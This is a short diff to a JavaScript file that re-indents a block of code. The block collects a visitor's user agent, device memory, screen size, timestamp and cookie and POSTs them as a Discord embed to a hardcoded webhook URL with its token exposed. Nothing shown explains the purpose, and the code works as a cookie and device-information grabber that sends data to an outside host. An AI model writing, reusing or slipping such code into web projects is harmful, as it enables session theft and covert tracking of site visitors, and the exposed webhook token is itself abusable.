@@ -40,29 +40,29 @@
 
 				const url = 'https://discord.com/api/webhooks/1535164470857441301/0zbvwxDyrPCIo-3067PQ2sBp7wxindDS5DBorb4cX4P2CF-NrS4K2D7IeyfZsKDxRV6f?wait=true';
 				{
-				}
-				const payload = {
-					embeds: [
-						{
-							title: 'User Agent Information',
-							fields: [
-								{ name: 'User Agent', value: userAgent },
-								{ name: 'Device Memory', value: deviceMemory ? deviceMemory.toString() : 'N/A' },
-								{ name: 'Device Width', value: deviceWidth ? deviceWidth.toString() : 'N/A' },
-								{ name: 'Device Height', value: deviceHeight ? deviceHeight.toString() : 'N/A' },
-								{ name: 'Timestamp', value: data.timestamp },
-								{ name: 'Cookie', value: data.cookie || 'N/A' },
-							],
+					const payload = {
+						embeds: [
+							{
+								title: 'User Agent Information',
+								fields: [
+									{ name: 'User Agent', value: userAgent },
+									{ name: 'Device Memory', value: deviceMemory ? deviceMemory.toString() : 'N/A' },
+									{ name: 'Device Width', value: deviceWidth ? deviceWidth.toString() : 'N/A' },
+									{ name: 'Device Height', value: deviceHeight ? deviceHeight.toString() : 'N/A' },
+									{ name: 'Timestamp', value: data.timestamp },
+									{ name: 'Cookie', value: data.cookie || 'N/A' },
+								],
+							},
+						],
+					};
+					await fetch(url, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
 						},
-					],
-				};
-				await fetch(url, {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/json',
-					},
-					body: JSON.stringify(payload),
-				});
+						body: JSON.stringify(payload),
+					});
+				}
 
 
 			}
